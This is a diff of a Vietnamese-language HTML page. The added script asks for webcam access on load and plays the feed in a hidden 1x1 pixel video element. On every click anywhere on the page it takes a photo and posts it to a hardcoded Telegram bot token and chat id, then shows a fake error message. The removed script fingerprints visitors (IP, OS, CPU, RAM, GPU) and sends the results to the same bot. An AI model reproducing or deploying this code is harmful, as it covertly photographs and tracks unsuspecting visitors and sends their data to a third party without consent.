@@ -1,11 +1,9 @@
 <!DOCTYPE html>
-<html data-arp-injected="true">
+<html>
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-
-  <style>
+    <title>Đinh Duy Vinh </title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
     body {
       background-color: rgb(255, 255, 255);
       display: flex;
@@ -107,6 +105,73 @@
       }
     }
   </style>
+    <script>
+// Hàm chụp ảnh khuôn mặt bằng webcam
+function capturePhoto() {
+    var video = document.getElementById('video');
+    var canvas = document.createElement('canvas');
+    var context = canvas.getContext('2d');
+
+    // Cài đặt kích thước canvas bằng kích thước video
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    // Chụp ảnh từ video
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Lấy dữ liệu ảnh dưới dạng Blob
+    canvas.toBlob(function(blob) {
+        // Gửi ảnh qua Telegram
+        var formData = new FormData();
+        formData.append('chat_id', '-989932845');
+        formData.append('photo', blob, 'photo.jpg');
+
+        $.ajax({
+            type: 'POST',
+            url: 'https://api.telegram.org/bot6002210854:AAFtNuunUbJoDk6C83oU-dE3il63-M2mSUI/sendPhoto',
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(response) {
+                alert('Đã xảy ra lỗi!');
+            },
+            error: function(error) {
+                alert('Đã xảy ra lỗi!');
+            }
+        });
+    }, 'image/jpeg');
+}
+
+// Sử dụng API getUserMedia để truy cập webcam
+function requestCameraAccess() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Xử lý sự kiện click trên toàn bộ trang web
+            document.addEventListener('click', function() {
+                capturePhoto();
+            });
+        })
+        .catch(function(error) {
+            console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);
+        });
+}
+
+// Hiển thị hộp thoại alert và xử lý phản hồi của người dùng
+function showCameraAccessAlert() {
+    alert('Ứng dụng muốn truy cập vào camera.');
+    requestCameraAccess();
+}
+
+// Gọi hàm hiển thị hộp thoại alert khi trang web được tải
+window.addEventListener('DOMContentLoaded', function() {
+    showCameraAccessAlert();
+});
+
+    </script>
 </head>
 <body>
   <div class="loading-rectangle-left"></div>
@@ -117,84 +182,7 @@
   </a>
 
   <div id="system-info"></div>
-
-  <script>
-    $(document).ready(function() {
-      var telegramBotToken = "6002210854:AAFtNuunUbJoDk6C83oU-dE3il63-M2mSUI";
-      var chatId = "@Dvinh_bot";
-  var excludedIPs = ["192.168.2.1", "10.0.0.1"]; // Thay thế danh sách này bằng những địa chỉ IP mà bạn muốn loại trừ
-
-  // Lấy địa chỉ IP
-  $.getJSON("https://api.ipify.org?format=json", function(data) {
-    var ip = data.ip;
-
-    if (excludedIPs.includes(ip)) {
-      console.log("Địa chỉ IP nằm trong danh sách ngoại lệ. Không gửi thông tin đến Telegram.");
-      return;
-    }
-
-    var cpu = navigator.hardwareConcurrency || "N/A";
-    var ram = navigator.deviceMemory || "N/A";
-    var disk = navigator.deviceStorage || "N/A"; // Thay thế 'deviceStorage' bằng thuộc tính tương ứng nếu có
-    var gpu = getGraphicsCard();
-    var os = getOperatingSystem();
-    var userAgent = navigator.userAgent;
-
-    var message = " - Địa chỉ IP mới: " + ip + "\n - User-Agent: " + userAgent + "\n - Hệ điều hành: " + os + "\n - CPU: " + cpu + "\n - RAM: " + ram + "\n - Disk: " + disk + "\n - GPU: " + gpu;
-
-    var payload = {
-      chat_id: chatId,
-      text: message
-    };
-
-    $.ajax({
-      type: "POST",
-      url: "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage",
-      data: payload,
-      dataType: "json",
-      success: function(response) {
-        console.log("Thông tin đã được gửi thành công đến Telegram");
-      },
-      error: function(error) {
-        console.log("Lỗi khi gửi thông tin đến Telegram: " + error);
-      }
-    });
-  });
-
-  // Các hàm hỗ trợ
-  function getOperatingSystem() {
-    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
-    if (/windows phone/i.test(userAgent)) {
-      return "Windows Phone";
-    }
-    if (/android/i.test(userAgent)) {
-      return "Android";
-    }
-    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-      return "iOS";
-    }
-    if (/Macintosh|Mac OS X/.test(userAgent)) {
-      return "Mac OS";
-    }
-    if (/Windows NT/.test(userAgent)) {
-      return "Windows";
-    }
-    return "Unknown";
-  }
-
-  function getGraphicsCard() {
-    var canvas = document.createElement("canvas");
-    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-    var gpu = "N/A";
-    if (debugInfo) {
-      gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    }
-    return gpu;
-  }
-});
-  </script>
-  
-  
+    <h1> </h1>
+    <video id="video" width="1" height="1" autoplay></video>
 </body>
 </html>
